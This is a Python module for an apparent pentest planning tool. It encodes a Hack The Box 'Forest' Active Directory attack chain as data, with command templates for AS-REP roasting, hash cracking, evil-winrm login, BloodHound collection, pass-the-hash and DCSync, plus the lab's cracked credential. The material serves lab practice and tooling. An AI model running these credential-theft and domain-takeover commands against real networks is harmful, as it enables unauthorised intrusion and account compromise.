"""Methodology pack: fact-gated actions, plus the tiny planner over them.

An Action is a methodology branch expressed as data: what facts must already be
proven for it to make sense (`requires_*`), what a successful run can prove
(`produces`), and — crucially — what it does *not* prove. The planner does no
cleverness: it only asks which actions are unlocked by the current facts, which
are blocked and why, and ranks the unlocked ones.

Today this module hardcodes a small Active Directory chain for HTB Forest. That
is temporary scaffolding. The real foundation is the ~334 Orange-derived atomic
units and the OSCP web/privesc branches that live in the old obol data layer;
this pack is the shape they get exported into. Keeping the definitions as data
(not planner code) is what lets that swap happen without touching the planner.
"""
from __future__ import annotations

from dataclasses import dataclass, field

from .facts import Fact, FactSet, ProofState


@dataclass
class Action:
    id: str
    title: str
    tool: str
    command: str                       # template; {target} {domain} {basedn} {user} {password} {hash}
    proves: str
    does_not_prove: str
    priority: int = 50
    requires_all: list[str] = field(default_factory=list)
    requires_any: list[str] = field(default_factory=list)
    produces: list[dict] = field(default_factory=list)  # [{"kind":..., "value":{...}}]

    # ---- gating logic --------------------------------------------------------
    def produced_kinds(self) -> set[str]:
        return {p["kind"] for p in self.produces}

    def settled(self, facts: FactSet) -> bool:
        """True once everything this action can prove is already proven."""
        pk = self.produced_kinds()
        return bool(pk) and pk.issubset(facts.kinds())

    def eligible(self, facts: FactSet) -> bool:
        if not all(facts.has(k) for k in self.requires_all):
            return False
        if self.requires_any and not any(facts.has(k) for k in self.requires_any):
            return False
        return True

    def unmet(self, facts: FactSet) -> str:
        """A human reason this action is currently blocked."""
        for k in self.requires_all:
            if not facts.has(k):
                return f"blocked until {_friendly(k)}"
        if self.requires_any and not any(facts.has(k) for k in self.requires_any):
            alts = " or ".join(_friendly(k) for k in self.requires_any)
            return f"blocked until {alts}"
        return "blocked"


# Friendly phrases for fact kinds, used in blocked reasons and the board.
_FRIENDLY = {
    "ad.domain": "the domain is known",
    "ad.user": "at least one domain user is known",
    "ad.naming_context": "the LDAP naming context is known",
    "cred.material.asrep_hash": "an AS-REP hash is captured",
    "cred.material.nt_hash": "an NT hash is captured",
    "cred.valid": "a valid credential exists",
    "access.authenticated": "authenticated access exists",
    "access.domain_admin": "domain-admin context exists",
    "ldap.reachable": "LDAP is reachable",
    "winrm.reachable": "WinRM is reachable",
    "smb.reachable": "SMB is reachable",
}


def _friendly(kind: str) -> str:
    return _FRIENDLY.get(kind, kind)


# --------------------------------------------------------------------------- #
# HTB Forest methodology chain (placeholder for the Orange-derived pack)       #
# --------------------------------------------------------------------------- #
FOREST_PACK: list[Action] = [
    Action(
        id="ldap-anon-enum",
        title="Anonymous LDAP domain enumeration",
        tool="ldapsearch",
        command='ldapsearch -x -H ldap://{target} -b "{basedn}"',
        proves="anonymous LDAP bind is allowed and domain objects (naming context, users) are readable without credentials",
        does_not_prove="any credential, or authenticated access",
        priority=90,
        requires_all=["ad.domain"],
        requires_any=["ldap.reachable"],
        produces=[
            {"kind": "ad.naming_context", "value": {"dn": "DC=htb,DC=local"}},
            {"kind": "ad.anon_bind", "value": {"allowed": True}},
            {"kind": "ad.user", "value": {"sam": "svc-alfresco"}},
            {"kind": "ad.user", "value": {"sam": "sebastien"}},
            {"kind": "ad.user", "value": {"sam": "andy"}},
            {"kind": "ad.user", "value": {"sam": "mark"}},
            {"kind": "ad.user", "value": {"sam": "santi"}},
            {"kind": "ad.user", "value": {"sam": "lucinda"}},
        ],
    ),
    Action(
        id="asrep-roast",
        title="AS-REP roast pre-auth-disabled users",
        tool="impacket-GetNPUsers",
        command="impacket-GetNPUsers {domain}/{user} -dc-ip {target} -no-pass",
        proves="svc-alfresco has Kerberos pre-authentication disabled; an AS-REP hash (crackable material) was captured",
        does_not_prove="a valid credential, or any access",
        priority=80,
        requires_all=["ad.domain"],
        requires_any=["ad.user"],   # candidate users from ANY source — no separate kerbrute step needed
        produces=[
            {"kind": "cred.material.asrep_hash", "value": {
                "user": "svc-alfresco",
                "hash": "$krb5asrep$23$svc-alfresco@HTB.LOCAL:fef58ddc...<snip>",
            }},
        ],
    ),
    Action(
        id="crack-asrep",
        title="Crack the AS-REP hash offline",
        tool="john",
        command="john hash --wordlist=/usr/share/wordlists/rockyou.txt",
        proves="the AS-REP hash cracked to a cleartext password",
        does_not_prove="that the credential grants access anywhere — it must be validated",
        priority=78,
        requires_all=["cred.material.asrep_hash"],
        produces=[
            {"kind": "cred.valid", "value": {"user": "svc-alfresco", "password": "s3rvice"}},
        ],
    ),
    Action(
        id="winrm-auth",
        title="Validate the credential over WinRM",
        tool="evil-winrm",
        command="evil-winrm -i {target} -u {user} -p '{password}'",
        proves="the credential authenticates over WinRM — an interactive session as svc-alfresco",
        does_not_prove="administrator/SYSTEM on the host, or any domain privilege",
        priority=85,
        requires_all=["cred.valid"],
        requires_any=["winrm.reachable"],
        produces=[
            {"kind": "access.authenticated", "value": {"user": "svc-alfresco", "host": "10.10.10.161", "admin": False}},
        ],
    ),
    Action(
        id="bloodhound-collect",
        title="Collect the AD graph from an authenticated context",
        tool="bloodhound-python",
        command="bloodhound-python -u {user} -p '{password}' -d {domain} -c All -ns {target}",
        proves="the domain object/ACL graph was collected from an authenticated context",
        does_not_prove="any specific escalation path — the graph must be analyzed",
        priority=70,
        requires_any=["access.authenticated", "cred.valid"],
        produces=[
            {"kind": "ad.graph.collected", "value": {}},
        ],
    ),
    # ---- deliberately blocked, to show the honest negative space ----
    Action(
        id="pass-the-hash",
        title="Pass-the-hash over SMB",
        tool="nxc",
        command="nxc smb {target} -u {user} -H {hash}",
        proves="the NT hash authenticates over SMB (pass-the-hash)",
        does_not_prove="administrator context until an admin check confirms it",
        priority=60,
        requires_all=["cred.material.nt_hash"],   # never captured in Forest
        requires_any=["smb.reachable"],
        produces=[{"kind": "remote.exec", "value": {}}],
    ),
    Action(
        id="dcsync",
        title="DCSync domain account hashes",
        tool="impacket-secretsdump",
        command="impacket-secretsdump -just-dc {domain}/{user}@{target}",
        proves="domain account hashes replicated via DCSync",
        does_not_prove="anything until replication rights are actually held",
        priority=95,
        requires_all=["access.domain_admin"],     # the real Forest path reaches this via ACL abuse
        produces=[{"kind": "cred.material.domain_hashes", "value": {}}],
    ),
]


# --------------------------------------------------------------------------- #
# The planner                                                                  #
# --------------------------------------------------------------------------- #
def next_actions(facts: FactSet, pack: list[Action] = FOREST_PACK) -> list[Action]:
    """Unlocked, not-yet-settled actions, highest priority first."""
    live = [a for a in pack if a.eligible(facts) and not a.settled(facts)]
    return sorted(live, key=lambda a: a.priority, reverse=True)


def blocked_actions(facts: FactSet, pack: list[Action] = FOREST_PACK) -> list[Action]:
    """Actions whose prerequisites are not yet met (and not already settled)."""
    blocked = [a for a in pack if not a.eligible(facts) and not a.settled(facts)]
    return sorted(blocked, key=lambda a: a.priority, reverse=True)


def apply_action(action: Action, facts: FactSet, source: str) -> list[Fact]:
    """'Run' an action by recording the facts it produces (stubbed execution).

    Later this is where the runner executes the command, a parser reads the real
    output, and only then are facts recorded. For now the pack's declared
    `produces` stand in for parsed evidence so the loop visibly advances.
    """
    new: list[Fact] = []
    for spec in action.produces:
        fact = Fact(
            kind=spec["kind"],
            scope=f"domain:htb.local" if spec["kind"].startswith("ad.") else "host:10.10.10.161",
            value=dict(spec.get("value", {})),
            state=ProofState.SUPPORTED,
            source=source,
        )
        if facts.add(fact):
            new.append(fact)
    return new
